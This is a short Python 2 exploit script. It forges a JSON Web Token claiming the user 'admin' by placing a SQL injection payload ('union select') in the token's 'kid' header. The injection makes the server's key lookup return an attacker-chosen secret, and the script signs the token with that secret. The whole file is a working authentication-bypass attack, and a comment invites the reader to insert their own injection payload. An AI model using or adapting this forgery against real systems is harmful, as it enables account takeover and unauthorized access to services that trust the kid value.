import hmac
import base64
import hashlib
import json

#select key from keys where kid='aaa' union select 'test' 
header={"typ":"JWT","alg":"HS256","kid":"aaa' union select 'test"}
#add your sqli paylod in the kid
payload={"user":"admin"}
key ="test"

str=base64.urlsafe_b64encode(json.dumps(header)).rstrip("=")+"."+base64.urlsafe_b64encode(json.dumps(payload)).rstrip("=")

sig=base64.urlsafe_b64encode(hmac.new(key,str,hashlib.sha256).digest()).decode('utf8').rstrip("=") 

jwt_token=str+"."+sig

#print str+"."+sig

print "jwt_token has been generated:\n"+ jwt_token





